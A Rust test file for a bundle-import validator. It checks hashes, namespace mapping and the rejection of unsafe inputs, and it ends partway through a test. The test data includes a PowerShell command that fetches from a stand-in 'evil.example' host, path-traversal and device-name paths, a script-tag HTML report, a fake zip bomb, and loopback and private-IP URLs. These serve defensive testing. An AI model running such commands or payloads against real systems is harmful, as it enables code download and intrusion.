#![forbid(unsafe_code)]
#![deny(clippy::indexing_slicing, clippy::unwrap_used, clippy::expect_used)]

use oia_export::bundle::{
    AnalysisLicenseStatus, AnalysisReplayOutcome, AnalysisReplayRequest, AssetUseConditions,
    BundleEntryRole, BundleError, BundleImportInput, BundleLimitKind, BundleLimits,
    BundleManifestEntry, BundleOmissionEntry, BundleRecordEntry, BundleRecordKind, BundleReference,
    BundleReferenceTarget, CalibrationValidity, CandidateReplayOutput, CapabilityDeclaration,
    CapabilityKind, CapabilityRequirement, ImportedReportHandling, LocalAuthorityGrant,
    NonReplayableReason, OptionalRecordHandling, PackageIdentity, PinnedAnalysisSpec,
    PinnedCalibrationSpec, PinnedForecastSpec, PinnedGroupingDecision, PinnedQuerySpec,
    RedistributionCondition, ReplayContract, RetentionCondition, SUPPORTED_BUNDLE_FORMAT,
    SUPPORTED_BUNDLE_FORMAT_VERSION, StagedFilesystemEntryKind, StagedPayloadFile,
    SupportedCapabilities, ValidatedReferenceTarget, format_local_record_id,
    format_local_version_id, replay_analysis, validate_and_stage_bundle,
};
use oia_export::{
    OmissionReason, OriginClass, ReviewStatus, StopReason, TimeDisplay, TimePrecision,
};

const REPORT_V1: &[u8] = include_bytes!("../../../fixtures/documents/a03/originals/report-v1.txt");
const REPORT_V1_SHA256: &str = "fdc16e37d2fa6715d0b23141026e8d70f77de1f4e6630bcd2e1f47096c5b7ee5";
const REPORT_V2: &[u8] = include_bytes!("../../../fixtures/documents/a03/originals/report-v2.txt");
const REPORT_V2_SHA256: &str = "d9b9bb89b383c31fbb95d56691d2c2544fef72157a6e19107fb61b2b5dd6d55c";
const RECORDS_3_BYTES: &[u8] = b"{\"records\":3}";
const RECORDS_3_SHA256: &str = "e6e73c79bf472197bf17ed49bce0cd18c4075749ce442755d6f97adaa70f8fdc";
const HTML_REPORT_BYTES: &[u8] =
    b"<!doctype html><title>Bundled Report</title><script>evil()</script>";
const HTML_REPORT_SHA256: &str = "db4fcdbb68935856506bef91126a7e4900aa26a0b6a9ada25e55a8f5bbfcbdaa";
const OK_TRUE_BYTES: &[u8] = b"{\"ok\":true}";
const OK_TRUE_SHA256: &str = "4062edaf750fb8074e7e83e0c9028c94e32468a8b6f1614774328ef045150f93";
const DIFF_BYTES_SHA256: &str = "25e4a8b4235b9eb87928e6bef70ea8d318e31ec5f0be0b8665c95c94cfefe8dd";
const ZIP_BYTES: &[u8] = b"PK\x03\x04fake-zip-bomb-payload";
const ZIP_BYTES_SHA256: &str = "c9b64a2d534e50934d87372027333d8d9f185fdef3abf506266b2fa802f64f50";
const DOCX_BYTES: &[u8] = b"PK\x03\x04synthetic-docx-evidence-payload";
const DOCX_BYTES_SHA256: &str = "0b59e6dc5c3520a47e6ba76c7057865f87a46a8efbab8ac888148af5563dadd1";
const EXACT_DET_OUT: &[u8] = b"exact-deterministic-output-v1";
const EXACT_DET_OUT_SHA256: &str =
    "c9c6214f53d4d3bfd9cd678be14c27fbd38d3e11cf805c906178bc65222be6f6";

fn utc_time(text: &'static str) -> TimeDisplay<'static> {
    TimeDisplay {
        text,
        precision: TimePrecision::ExactInstant,
        time_reference: "UTC",
    }
}

/// Verifies staged bundle integrity, duplicate-byte record separation, injective length-prefixed
/// local workspace namespace mapping, origin actor authority stripping, retained domain fields,
/// DOCX/ZIP evidence assets, and inert report handling (`REPRO-01`, `REPRO-02`, `A17`).
#[test]
fn validates_bundle_hashes_maps_local_namespace_and_keeps_duplicate_byte_records_distinct() {
    // B1: Injective length-prefixed local ID formatting prevents `/` delimiter collisions.
    let id_a = format_local_version_id("ws:dest", "ns:1", "doc:a", "1/ver/2");
    let id_b = format_local_version_id("ws:dest", "ns:1", "doc:a/ver/1", "2");
    assert_ne!(id_a, id_b);

    let v1_path = format!("assets/{REPORT_V1_SHA256}.txt");
    let v2_path = format!("assets/{REPORT_V2_SHA256}.txt");
    let docx_path = format!("assets/{DOCX_BYTES_SHA256}.docx");

    let capabilities = [
        CapabilityDeclaration {
            capability_id: "oia.record.evidence",
            kind: CapabilityKind::RecordSchema,
            version: 1,
            requirement: CapabilityRequirement::Required,
        },
        CapabilityDeclaration {
            capability_id: "oia.optional.future-telemetry",
            kind: CapabilityKind::RecordSchema,
            version: 2,
            requirement: CapabilityRequirement::Optional,
        },
    ];

    let manifest_entries = [
        BundleManifestEntry {
            relative_path: "records/records.json",
            role: BundleEntryRole::Records,
            media_type: "application/json",
            declared_byte_len: RECORDS_3_BYTES.len(),
            declared_sha256_hex: RECORDS_3_SHA256,
            schema_version: Some(1),
        },
        BundleManifestEntry {
            relative_path: &v1_path,
            role: BundleEntryRole::Assets,
            media_type: "text/plain; charset=utf-8",
            declared_byte_len: REPORT_V1.len(),
            declared_sha256_hex: REPORT_V1_SHA256,
            schema_version: None,
        },
        BundleManifestEntry {
            relative_path: &v2_path,
            role: BundleEntryRole::Assets,
            media_type: "text/plain; charset=utf-8",
            declared_byte_len: REPORT_V2.len(),
            declared_sha256_hex: REPORT_V2_SHA256,
            schema_version: None,
        },
        BundleManifestEntry {
            relative_path: &docx_path,
            role: BundleEntryRole::Assets,
            media_type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            declared_byte_len: DOCX_BYTES.len(),
            declared_sha256_hex: DOCX_BYTES_SHA256,
            schema_version: None,
        },
        BundleManifestEntry {
            relative_path: "reports/rendered.html",
            role: BundleEntryRole::Reports,
            media_type: "text/html; charset=utf-8",
            declared_byte_len: HTML_REPORT_BYTES.len(),
            declared_sha256_hex: HTML_REPORT_SHA256,
            schema_version: Some(1),
        },
    ];

    let staged_files = [
        StagedPayloadFile {
            relative_path: "records/records.json",
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: RECORDS_3_BYTES,
            rechecked_sha256_hex: Some(RECORDS_3_SHA256),
        },
        StagedPayloadFile {
            relative_path: &v1_path,
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: REPORT_V1,
            rechecked_sha256_hex: Some(REPORT_V1_SHA256),
        },
        StagedPayloadFile {
            relative_path: &v2_path,
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: REPORT_V2,
            rechecked_sha256_hex: Some(REPORT_V2_SHA256),
        },
        StagedPayloadFile {
            relative_path: &docx_path,
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: DOCX_BYTES,
            rechecked_sha256_hex: Some(DOCX_BYTES_SHA256),
        },
        StagedPayloadFile {
            relative_path: "reports/rendered.html",
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: HTML_REPORT_BYTES,
            rechecked_sha256_hex: Some(HTML_REPORT_SHA256),
        },
    ];

    let use_conditions = [AssetUseConditions {
        asset_path: &v1_path,
        source_id: "src:harbor-dispatch",
        ordinary_access_method: "Public archive HTTP download",
        attribution_notice: "Harbor log v1",
        automated_processing_permitted: true,
        retention: RetentionCondition::ReviewWindowOnly {
            window_note: "Retain during active peer review window",
        },
        redistribution: RedistributionCondition::PermittedWithAttribution,
    }];

    let records = [
        BundleRecordEntry {
            origin_namespace: "ws:origin-alpha",
            record_id: "doc:report-original",
            version_id: "ver:v1",
            kind: BundleRecordKind::SourceDocument,
            origin_class: OriginClass::Observation,
            review_status: ReviewStatus::Reviewed,
            origin_actor_id: "owner:remote-admin",
            recorded_time: utc_time("2026-03-14T22:15:00Z"),
            uncertainty_note: Some("Multi-line note:\nclock drift within +/- 30s"),
            asset_relative_path: Some(&v1_path),
            required_capability: Some(("oia.record.evidence", 1)),
        },
        BundleRecordEntry {
            origin_namespace: "ws:origin-alpha",
            record_id: "doc:report-mirror-republication",
            version_id: "ver:mirror-v1",
            kind: BundleRecordKind::SourceDocument,
            origin_class: OriginClass::SourceAssertion,
            review_status: ReviewStatus::Reviewed,
            origin_actor_id: "owner:remote-admin",
            recorded_time: TimeDisplay {
                text: "2026-03-15",
                precision: TimePrecision::DateOnly,
                time_reference: "UTC",
            },
            uncertainty_note: Some("Identical bytes from secondary mirror"),
            asset_relative_path: Some(&v1_path),
            required_capability: Some(("oia.record.evidence", 1)),
        },
        BundleRecordEntry {
            origin_namespace: "ws:origin-alpha",
            record_id: "rec:optional-telemetry",
            version_id: "ver:opt-01",
            kind: BundleRecordKind::Annotation,
            origin_class: OriginClass::Observation,
            review_status: ReviewStatus::Unreviewed,
            origin_actor_id: "owner:remote-admin",
            recorded_time: utc_time("2026-03-15T01:00:00Z"),
            uncertainty_note: None,
            asset_relative_path: Some(&docx_path),
            required_capability: Some(("oia.optional.future-telemetry", 2)),
        },
    ];

    let references = [
        BundleReference {
            reference_id: "ref:mirror-repeats-orig",
            from_record_id: "doc:report-mirror-republication",
            from_version_id: "ver:mirror-v1",
            relation: "repeats-source",
            target: BundleReferenceTarget::IncludedRecord {
                target_record_id: "doc:report-original",
                target_version_id: "ver:v1",
            },
        },
        BundleReference {
            reference_id: "ref:orig-links-optional",
            from_record_id: "doc:report-original",
            from_version_id: "ver:v1",
            relation: "annotated-by",
            target: BundleReferenceTarget::IncludedRecord {
                target_record_id: "rec:optional-telemetry",
                target_version_id: "ver:opt-01",
            },
        },
        BundleReference {
            reference_id: "ref:external-users-path",
            from_record_id: "doc:report-original",
            from_version_id: "ver:v1",
            relation: "external-context",
            target: BundleReferenceTarget::ExternalReferenceOnly {
                target_record_id: "ext:doc-99",
                target_version_id: "ver:ext-1",
                source_id: "src:public-web",
                external_url: Some("https://example.org/users/public-archive/item-99"),
                reason: OmissionReason::NotSelected,
            },
        },
    ];

    let omissions = [BundleOmissionEntry {
        omitted_id: "ext:doc-99",
        source_id: "src:public-web",
        version_id: "ver:ext-1",
        reason: OmissionReason::NotSelected,
        coverage_effect: "External context link only",
        unreproducible_step_note: None,
    }];

    let query_inputs = [("doc:report-original", "ver:v1")];
    let queries = [PinnedQuerySpec {
        query_id: "query:powershell-mention",
        version_id: "ver:q1",
        query_expression: "term:\"powershell\" AND harbor",
        pinned_input_versions: &query_inputs,
        coverage_note: "Searching for literal word powershell in documents is allowed",
    }];

    let groupings = [PinnedGroupingDecision {
        grouping_id: "group:g1",
        version_id: "ver:g1",
        rationale: "Grouped for comparison",
        member_record_versions: &query_inputs,
        is_reversible: true,
    }];

    let forecasts = [PinnedForecastSpec {
        forecast_id: "fcst:f1",
        version_id: "ver:f1",
        cutoff_time: utc_time("2026-03-16T00:00:00Z"),
        prediction_summary: "Annex release within 30d",
        pinned_input_versions: &query_inputs,
    }];

    let input = BundleImportInput {
        identity: PackageIdentity {
            format: SUPPORTED_BUNDLE_FORMAT,
            format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
            package_id: "pkg:test-01",
            created_time: utc_time("2026-11-02T18:00:00Z"),
            producer_id: "oia-test",
            producer_version: "0.1.0",
        },
        destination_case_id: "case:local-new-01",
        local_namespace_prefix: "ws:dest-01",
        existing_case_ids: &["case:existing-99"],
        capabilities: &capabilities,
        manifest_entries: &manifest_entries,
        staged_files: &staged_files,
        use_conditions: &use_conditions,
        records: &records,
        references: &references,
        omissions: &omissions,
        queries: &queries,
        groupings: &groupings,
        calibrations: &[],
        forecasts: &forecasts,
        analyses: &[],
    };

    let supported = SupportedCapabilities {
        supported: &[("oia.record.evidence", 1)],
        allow_inert_optional_records: true,
    };

    let res =
        validate_and_stage_bundle(
            &input,
            &supported,
            BundleLimits::default_limits(),
            || Ok(()),
        );
    assert!(res.is_ok(), "expected valid bundle, got {res:?}");
    let Ok(bundle) = res else {
        return;
    };

    assert_eq!(
        bundle.omitted_optional_capabilities(),
        &[("oia.optional.future-telemetry".to_owned(), 2)]
    );
    assert_eq!(bundle.mapped_records().len(), 3);
    assert_eq!(bundle.identity().producer_id, "oia-test");
    assert_eq!(bundle.capabilities().len(), 2);
    assert_eq!(bundle.use_conditions().len(), 1);
    assert_eq!(bundle.references().len(), 3);
    assert_eq!(bundle.omissions().len(), 1);
    assert_eq!(bundle.queries().len(), 1);
    assert_eq!(bundle.groupings().len(), 1);
    assert_eq!(bundle.forecasts().len(), 1);

    let Some(first) = bundle.mapped_records().first() else {
        return;
    };
    let Some(second) = bundle.mapped_records().get(1) else {
        return;
    };
    let Some(third) = bundle.mapped_records().get(2) else {
        return;
    };

    // Identical asset SHA-256 bytes, but distinct origin and mapped local identities.
    assert_eq!(first.asset_sha256_hex, second.asset_sha256_hex);
    assert_eq!(
        first.required_capability,
        Some(("oia.record.evidence".to_owned(), 1))
    );
    assert!(first.asset_relative_path.is_some());
    assert_ne!(first.origin_record_id, second.origin_record_id);
    assert_ne!(first.local_record_id, second.local_record_id);
    assert_ne!(first.local_version_id, second.local_version_id);
    assert_eq!(
        first.local_record_id,
        format_local_record_id("ws:dest-01", "ws:origin-alpha", "doc:report-original")
    );
    assert_eq!(
        first.uncertainty_note.as_deref(),
        Some("Multi-line note:\nclock drift within +/- 30s")
    );
    assert_eq!(first.recorded_time.text, "2026-03-14T22:15:00Z");

    // Imported actor names never confer local authority.
    assert_eq!(
        first.attributed_actor.local_authority,
        LocalAuthorityGrant::None
    );
    assert_eq!(first.attributed_actor.origin_namespace, "ws:origin-alpha");

    // Unsupported optional capability record is retained as inert opaque bytes rather than executed.
    assert_eq!(
        third.optional_handling,
        OptionalRecordHandling::RetainedInertOpaqueBytes {
            capability_id: "oia.optional.future-telemetry".to_owned(),
            version: 2,
        }
    );

    // When `allow_inert_optional_records` is false, the optional record is omitted cleanly and
    // references to it are rewritten to `PermittedUnavailable` instead of failing validation (NB4).
    let supported_omit = SupportedCapabilities {
        supported: &[("oia.record.evidence", 1)],
        allow_inert_optional_records: false,
    };
    let res_omit = validate_and_stage_bundle(
        &input,
        &supported_omit,
        BundleLimits::default_limits(),
        || Ok(()),
    );
    assert!(
        res_omit.is_ok(),
        "expected valid bundle when omitting optional records, got {res_omit:?}"
    );
    if let Ok(bundle_omit) = res_omit {
        assert_eq!(bundle_omit.mapped_records().len(), 3);
        if let Some(omitted_rec) = bundle_omit.mapped_records().get(2) {
            assert_eq!(
                omitted_rec.optional_handling,
                OptionalRecordHandling::OmittedWithNotice {
                    capability_id: "oia.optional.future-telemetry".to_owned(),
                    version: 2,
                }
            );
        }
        let opt_ref = bundle_omit
            .references()
            .iter()
            .find(|r| r.reference_id == "ref:orig-links-optional");
        assert!(matches!(
            opt_ref.map(|r| &r.target),
            Some(ValidatedReferenceTarget::PermittedUnavailable {
                reason: OmissionReason::Unsupported,
                ..
            })
        ));
    }

    // Bundled readable report under reports/ is flagged as untrusted requiring regeneration or inert viewer.
    let report_entry = bundle
        .verified_entries()
        .iter()
        .find(|e| e.relative_path == "reports/rendered.html");
    assert!(report_entry.is_some());
    if let Some(rep) = report_entry {
        assert_eq!(rep.schema_version, Some(1));
        assert_eq!(
            rep.report_handling,
            Some(ImportedReportHandling::UntrustedRequiresRegenerationOrInertViewer)
        );
    }
}

/// Verifies rejection of path traversal, non-ASCII path segments, Windows reserved device names,
/// case-insensitive path collisions, non-regular filesystem entries, archive containers outside
/// `assets/`, corrupt asset hashes, mid-staging mutation, conflicting omissions, cross-namespace
/// duplicate `(record_id, version_id)`, and forbidden side-effect hooks (`REPRO-02`, `A17`,
/// `docs/contracts/report-export.md` §6).
#[test]
fn rejects_traversal_windows_devices_symlinks_archives_corrupt_hashes_and_side_effects() {
    let base_entry = BundleManifestEntry {
        relative_path: "records/ok.json",
        role: BundleEntryRole::Records,
        media_type: "application/json",
        declared_byte_len: OK_TRUE_BYTES.len(),
        declared_sha256_hex: OK_TRUE_SHA256,
        schema_version: Some(1),
    };
    let base_staged = StagedPayloadFile {
        relative_path: "records/ok.json",
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: OK_TRUE_BYTES,
        rechecked_sha256_hex: Some(OK_TRUE_SHA256),
    };

    fn make_input<'a>(
        entries: &'a [BundleManifestEntry<'a>],
        staged: &'a [StagedPayloadFile<'a>],
    ) -> BundleImportInput<'a> {
        BundleImportInput {
            identity: PackageIdentity {
                format: SUPPORTED_BUNDLE_FORMAT,
                format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
                package_id: "pkg:adversarial",
                created_time: utc_time("2026-11-02T18:00:00Z"),
                producer_id: "oia-test",
                producer_version: "0.1.0",
            },
            destination_case_id: "case:dest",
            local_namespace_prefix: "ws:dest",
            existing_case_ids: &[],
            capabilities: &[],
            manifest_entries: entries,
            staged_files: staged,
            use_conditions: &[],
            records: &[],
            references: &[],
            omissions: &[],
            queries: &[],
            groupings: &[],
            calibrations: &[],
            forecasts: &[],
            analyses: &[],
        }
    }
    let supported = SupportedCapabilities {
        supported: &[],
        allow_inert_optional_records: false,
    };
    let limits = BundleLimits::default_limits();

    // 1. Path traversal `..`
    let traversal_entries = [BundleManifestEntry {
        relative_path: "records/../escape.json",
        ..base_entry
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&traversal_entries, &[]),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::InvalidRelativePath { .. })
    ));

    // 2. Windows reserved device names (`COM1.json`, `CONIN$.json`) and non-ASCII `Ä.json` (B3)
    for bad_path in [
        "records/COM1.json",
        "records/CONIN$.json",
        "records/Ä.json",
        "records/bad?.json",
    ] {
        let bad_entries = [BundleManifestEntry {
            relative_path: bad_path,
            ..base_entry
        }];
        assert!(
            matches!(
                validate_and_stage_bundle(
                    &make_input(&bad_entries, &[]),
                    &supported,
                    limits,
                    || Ok(())
                ),
                Err(BundleError::InvalidRelativePath { .. })
            ),
            "expected {bad_path} to be rejected"
        );
    }

    // 3. Case-insensitive path collision
    let collision_entries = [
        BundleManifestEntry {
            relative_path: "records/Item.json",
            ..base_entry
        },
        BundleManifestEntry {
            relative_path: "records/item.json",
            ..base_entry
        },
    ];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&collision_entries, &[]),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::CaseInsensitivePathCollision { .. })
    ));

    // 4. Symlink / reparse point rejection
    let symlink_entries = [base_entry];
    let symlink_staged = [StagedPayloadFile {
        entry_kind: StagedFilesystemEntryKind::Symlink,
        ..base_staged
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&symlink_entries, &symlink_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::UnsafeFilesystemEntry {
            entry_kind: StagedFilesystemEntryKind::Symlink,
            ..
        })
    ));

    // 5. Compressed bomb / ZIP magic header rejection on non-asset roles without unpacking
    let clean_zip_entries = [BundleManifestEntry {
        relative_path: "records/payload.json",
        declared_byte_len: ZIP_BYTES.len(),
        declared_sha256_hex: ZIP_BYTES_SHA256,
        ..base_entry
    }];
    let clean_zip_staged = [StagedPayloadFile {
        relative_path: "records/payload.json",
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: ZIP_BYTES,
        rechecked_sha256_hex: None,
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&clean_zip_entries, &clean_zip_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::ArchiveContainerRejected { .. })
    ));

    // 6. Corrupt asset bytes (never silently downgraded to missing)
    let corrupt_staged = [StagedPayloadFile {
        relative_path: "records/ok.json",
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: b"{\"ok\":0000}",
        rechecked_sha256_hex: None,
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&[base_entry], &corrupt_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::IntegrityHashMismatch { .. })
    ));

    // 7. Mid-staging input mutation (`InputChangedDuringStaging`)
    let mutated_staged = [StagedPayloadFile {
        rechecked_sha256_hex: Some(DIFF_BYTES_SHA256),
        ..base_staged
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&[base_entry], &mutated_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::InputChangedDuringStaging { .. })
    ));

    // 8. Forbidden executable hook in reproduction query (`powershell -Command`)
    let ok_entries = [base_entry];
    let ok_staged = [base_staged];
    let mut hook_input = make_input(&ok_entries, &ok_staged);
    let bad_queries = [PinnedQuerySpec {
        query_id: "query:bad",
        version_id: "ver:q1",
        query_expression: "powershell -Command Invoke-WebRequest https://evil.example",
        pinned_input_versions: &[],
        coverage_note: "test",
    }];
    hook_input.queries = &bad_queries;
    assert!(matches!(
        validate_and_stage_bundle(&hook_input, &supported, limits, || Ok(())),
        Err(BundleError::ForbiddenBundleSideEffect { .. })
    ));

    // 9. Conflicting record and omission (B2)
    let mut conflict_input = make_input(&ok_entries, &ok_staged);
    let conflict_records = [BundleRecordEntry {
        origin_namespace: "ws:1",
        record_id: "doc:conflict",
        version_id: "ver:1",
        kind: BundleRecordKind::SourceDocument,
        origin_class: OriginClass::Observation,
        review_status: ReviewStatus::Reviewed,
        origin_actor_id: "actor:1",
        recorded_time: utc_time("2026-11-02T18:00:00Z"),
        uncertainty_note: None,
        asset_relative_path: None,
        required_capability: None,
    }];
    let conflict_omissions = [BundleOmissionEntry {
        omitted_id: "doc:conflict",
        source_id: "src:1",
        version_id: "ver:1",
        reason: OmissionReason::Restricted,
        coverage_effect: "conflicting entry",
        unreproducible_step_note: None,
    }];
    conflict_input.records = &conflict_records;
    conflict_input.omissions = &conflict_omissions;
    assert!(matches!(
        validate_and_stage_bundle(&conflict_input, &supported, limits, || Ok(())),
        Err(BundleError::DuplicateIdentifier {
            kind: "record_and_omission",
            ..
        })
    ));

    // 10. Order-independent rejection of duplicate `(record_id, version_id)` across different
    // `origin_namespace` values (N1)
    let rec_ns_a = BundleRecordEntry {
        origin_namespace: "ws:ns-a",
        record_id: "doc:shared",
        version_id: "ver:1",
        kind: BundleRecordKind::SourceDocument,
        origin_class: OriginClass::Observation,
        review_status: ReviewStatus::Reviewed,
        origin_actor_id: "actor:1",
        recorded_time: utc_time("2026-11-02T18:00:00Z"),
        uncertainty_note: None,
        asset_relative_path: None,
        required_capability: None,
    };
    let rec_ns_b = BundleRecordEntry {
        origin_namespace: "ws:ns-b",
        ..rec_ns_a
    };
    for pair in [[rec_ns_a, rec_ns_b], [rec_ns_b, rec_ns_a]] {
        let mut dup_ns_input = make_input(&ok_entries, &ok_staged);
        dup_ns_input.records = &pair;
        assert!(matches!(
            validate_and_stage_bundle(&dup_ns_input, &supported, limits, || Ok(())),
            Err(BundleError::DuplicateIdentifier {
                kind: "record_version",
                ..
            })
        ));
    }

    // 11. Loopback / private-network / integer-IP / IPv6-mapped external URLs rejected (NB5 + N-nonblocking 3)
    for bad_url in [
        "http://0.0.0.0/internal",
        "http://[::1]:8080/internal",
        "http://172.16.5.4/internal",
        "http://2130706433/internal",
        "http://0x7f000001/internal",
        "http://[::ffff:127.0.0.1]/internal",
        "http://[fd00::1]/internal",
        "http://[fe80::1]/internal",
        "http://100.64.1.1/internal",
        "http://localhost./internal",
    ] {
        let mut url_input = make_input(&ok_entries, &ok_staged);
        let url_records = [BundleRecordEntry {
            origin_namespace: "ws:1",
            record_id: "doc:1",
            version_id: "ver:1",
            kind: BundleRecordKind::SourceDocument,
            origin_class: OriginClass::Observation,
            review_status: ReviewStatus::Reviewed,
            origin_actor_id: "actor:1",
            recorded_time: utc_time("2026-11-02T18:00:00Z"),
            uncertainty_note: None,
            asset_relative_path: None,
            required_capability: None,
        }];
        let url_omissions = [BundleOmissionEntry {
            omitted_id: "doc:ext",
            source_id: "src:ext",
            version_id: "ver:ext",
            reason: OmissionReason::NotSelected,
            coverage_effect: "external",
            unreproducible_step_note: None,
        }];
        let url_refs = [BundleReference {
            reference_id: "ref:bad-url",
            from_record_id: "doc:1",
            from_version_id: "ver:1",
            relation: "cites",
            target: BundleReferenceTarget::ExternalReferenceOnly {
                target_record_id: "doc:ext",
                target_version_id: "ver:ext",
                source_id: "src:ext",
                external_url: Some(bad_url),
                reason: OmissionReason::NotSelected,
            },
        }];
        url_input.records = &url_records;
        url_input.omissions = &url_omissions;
        url_input.references = &url_refs;
        assert!(
            matches!(
                validate_and_stage_bundle(&url_input, &supported, limits, || Ok(())),
                Err(BundleError::ForbiddenBundleSideEffect { .. })
            ),
            "expected {bad_url} to be rejected"
        );
    }
}

/// Verifies deterministic bitwise replay, numerical-tolerance replay (including both abs and rel
/// bounds, `expected == 0.0`, `max_rel_diff >= 1.0` and `-0.0` rejection, and length mismatch
/// reporting), and honest non-replayable reporting (`REPRO-03`, `A17`).
#[test]
fn verifies_bitwise_and_tolerance_replay_and_reports_non_replayable_reasons_honestly() {
    let v1_path = format!("assets/{REPORT_V1_SHA256}.txt");
    let expected_series = [0.0, 10.0, 20.0, 30.0];

    let capabilities = [
        CapabilityDeclaration {
            capability_id: "oia.record.evidence",
            kind: CapabilityKind::RecordSchema,
            version: 1,
            requirement: CapabilityRequirement::Required,
        },
        CapabilityDeclaration {
            capability_id: "oia.analysis.core",
            kind: CapabilityKind::AnalysisMethod,
            version: 1,
            requirement: CapabilityRequirement::Required,
        },
        CapabilityDeclaration {
            capability_id: "oia.analysis.future-gpu-solver",
            kind: CapabilityKind::AnalysisMethod,
            version: 2,
            requirement: CapabilityRequirement::Optional,
        },
    ];

    let manifest_entries = [BundleManifestEntry {
        relative_path: &v1_path,
        role: BundleEntryRole::Assets,
        media_type: "text/plain",
        declared_byte_len: REPORT_V1.len(),
        declared_sha256_hex: REPORT_V1_SHA256,
        schema_version: None,
    }];
    let staged_files = [StagedPayloadFile {
        relative_path: &v1_path,
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: REPORT_V1,
        rechecked_sha256_hex: Some(REPORT_V1_SHA256),
    }];

    let records = [BundleRecordEntry {
        origin_namespace: "ws:alpha",
        record_id: "doc:v1",
        version_id: "ver:1",
        kind: BundleRecordKind::SourceDocument,
        origin_class: OriginClass::Observation,
        review_status: ReviewStatus::Reviewed,
        origin_actor_id: "actor:1",
        recorded_time: utc_time("2026-03-14T22:15:00Z"),
        uncertainty_note: None,
        asset_relative_path: Some(&v1_path),
        required_capability: Some(("oia.record.evidence", 1)),
    }];

    let omissions = [BundleOmissionEntry {
        omitted_id: "doc:restricted-radar",
        source_id: "src:radar",
        version_id: "ver:radar-1",
        reason: OmissionReason::Restricted,
        coverage_effect: "Restricted radar track omitted",
        unreproducible_step_note: Some("Requires restricted source"),
    }];

    let calibrations = [
        PinnedCalibrationSpec {
            calibration_id: "cal:valid",
            version_id: "ver:c1",
            sensor_or_view_id: "cam:1",
            reference_description: "Star field",
            residual_rms: 0.15,
            residual_unit: "arcsec",
            validity: CalibrationValidity::Valid,
        },
        PinnedCalibrationSpec {
            calibration_id: "cal:moved",
            version_id: "ver:c2",
            sensor_or_view_id: "cam:2",
            reference_description: "Displaced tripod",
            residual_rms: 0.40,
            residual_unit: "arcsec",
            validity: CalibrationValidity::Invalidated {
                reason: "Camera bumped after calibration",
            },
        },
    ];

    let avail_inputs = [("doc:v1", "ver:1")];
    let omitted_inputs = [("doc:restricted-radar", "ver:radar-1")];
    let asset_paths = [v1_path.as_str()];

    let analyses = [
        PinnedAnalysisSpec {
            analysis_id: "ana:bitwise",
            version_id: "ver:a1",
            method_id: "method:exact",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "mode=exact",
            license_status: AnalysisLicenseStatus::Compatible {
                license_id: "MIT OR Apache-2.0",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &asset_paths,
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: EXACT_DET_OUT_SHA256,
                expected_byte_len: EXACT_DET_OUT.len(),
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            method_id: "method:numeric",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: Some("model:regressor"),
            model_version: Some("v1.2.0"),
            configuration_summary: "solver=rk4",
            license_status: AnalysisLicenseStatus::Compatible {
                license_id: "Apache-2.0",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &asset_paths,
            calibration_ref: Some(("cal:valid", "ver:c1")),
            replay_contract: ReplayContract::NumericalTolerance {
                expected_series: &expected_series,
                max_abs_diff: 0.10,
                max_rel_diff: 0.005,
                tolerance_justification: "Floating-point reduction tolerance",
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:omitted-source",
            version_id: "ver:a3",
            method_id: "method:radar-track",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "filter=kalman",
            license_status: AnalysisLicenseStatus::Compatible { license_id: "MIT" },
            pinned_input_versions: &omitted_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: EXACT_DET_OUT_SHA256,
                expected_byte_len: EXACT_DET_OUT.len(),
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:invalid-cal",
            version_id: "ver:a4",
            method_id: "method:triangulate",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "views=2",
            license_status: AnalysisLicenseStatus::Compatible { license_id: "MIT" },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &asset_paths,
            calibration_ref: Some(("cal:moved", "ver:c2")),
            replay_contract: ReplayContract::NumericalTolerance {
                expected_series: &expected_series,
                max_abs_diff: 0.05,
                max_rel_diff: 0.005,
                tolerance_justification: "Triangulation tolerance",
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:license-changed",
            version_id: "ver:a5",
            method_id: "method:proprietary",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "mode=std",
